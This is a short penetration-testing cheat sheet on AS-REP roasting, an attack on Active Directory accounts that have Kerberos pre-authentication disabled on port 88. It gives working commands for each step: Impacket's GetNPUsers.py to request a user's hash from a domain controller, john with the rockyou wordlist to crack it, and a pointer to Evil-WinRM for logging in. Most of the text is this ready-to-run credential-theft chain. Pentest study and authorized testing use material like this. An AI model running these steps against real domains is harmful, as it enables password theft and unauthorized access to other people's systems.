# Kerberos Pre-authentication: Port 88

If Kerberos pre-authentication is disabled for an account, it could be vulnerable to [ASREPRoasting](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/). 

1. Use [Impacket](../../Network/Network/impacket_tools/README.md)'s `GetNPUsers.py` script to obtain a TGT ticket

        GetNPUsers.py domain.local/username -request -no-pass -dc-ip 10.10.10.4

2. Save the obtained hash value in a file, and crack it using a [password cracking tool](../../Linux/password_guessing/README.md) 

        $ sudo john ./kb_preauth_hash.txt --wordlist=./rockyou.txt
        $ sudo john --show ./kb_preauth_hash.txt

3. Access the server using [Evil-WinRM](../winrm_5985/README.md)

## References

* https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/